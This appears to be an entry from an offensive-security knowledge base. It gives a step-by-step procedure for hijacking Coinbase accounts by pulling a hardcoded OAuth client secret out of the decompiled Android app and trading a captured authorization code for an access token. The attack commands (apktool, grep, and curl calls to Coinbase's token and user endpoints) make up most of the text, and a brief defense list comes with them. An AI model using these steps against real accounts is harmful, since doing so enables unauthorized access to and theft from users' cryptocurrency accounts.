---
id: proc-exchange-token-001
tags:
  - token-exchange
  - hardcoded-secret
  - api
type: procedure
tools: []
tactics:
  - '[[Credential Access]]'
commands: []
verified: false
platforms:
  - Android
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unsecured Credentials]]'
  - '[[Steal Web Session Cookie]]'
updated_at: '2025-12-14T17:24:42.148Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques:
  - '[[Credentials In Files]]'
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Unsecured Credentials]]'
  - '[[Steal Web Session Cookie]]'
---
# Exchange OAuth Code for Access Token Using Hardcoded Client Secret

## Summary

This procedure uses a captured OAuth response code combined with the Coinbase app's hardcoded client secret to request a valid access token from the Coinbase API, enabling unauthorized account access.

## Description

Exploiting both the log leakage and hardcoded credentials vulnerabilities, this procedure involves API calls to the token endpoint. It requires prior extraction of the client secret from app decompilation. In attack scenarios, this grants full API access to the victim's account. Expected outcome is a functional access token.

## Requirements

1. Captured OAuth response code
2. Hardcoded client secret extracted from Coinbase APK (e.g., via decompilation)
3. Network access to Coinbase API
4. Known client ID and redirect URI from app config

## Defense

Defensive measures and detection strategies:

- Avoid hardcoding secrets; use secure storage or runtime generation
- Implement rate limiting and anomaly detection on token endpoints
- Rotate client secrets regularly and monitor for unusual token requests

## Objectives

1. Authenticate the response code with client secret
2. Obtain a valid access token
3. Verify token usability for account actions

## Instructions

### Step 1: Extract Hardcoded Client Secret

**Context**: Decompile the Coinbase APK to find the embedded client secret.

**Command** (Using APKTool or similar; example with strings):
```bash
apktool d coinbase.apk
strings coinbase/smali/com/coinbase/*.smali | grep -i secret
```

> This extracts strings from decompiled APK; look for the client secret value. Expected output: Plain-text secret like "hardcoded_secret_value".

### Step 2: Perform Token Exchange API Call

**Context**: Send POST request to Coinbase OAuth token endpoint with captured code and secret.

**Command** ([[curl]] for API request):
```bash
curl -X POST https://api.coinbase.com/oauth/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'grant_type=authorization_code' \
  -d 'code=CAPTURED_OAUTH_CODE' \
  -d 'client_id=COINBASE_CLIENT_ID' \
  -d 'client_secret=HARDCODED_CLIENT_SECRET' \
  -d 'redirect_uri=coinbase://oauth/callback'
```

> Replace placeholders with actual values. Expected output: {"access_token": "eyJ...", "token_type": "bearer", "expires_in": 3600}.

### Step 3: Validate Access Token

**Context**: Test the token with a simple API call to confirm access.

**Command** (Test API):
```bash
curl -H "Authorization: Bearer ACCESS_TOKEN" https://api.coinbase.com/v2/user
```

> Expected output: User account details, confirming successful compromise.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]] Credential Access

### Techniques

- [[Unsecured Credentials]] Unsecured Credentials
- [[Steal Web Session Cookie]] Data from Local System

### Sub-Techniques

- [[Credentials In Files]] Credentials In Files

## Commands Used

- [[curl]]

## Tools Used


## Tags

- token-exchange
- hardcoded
- oauth
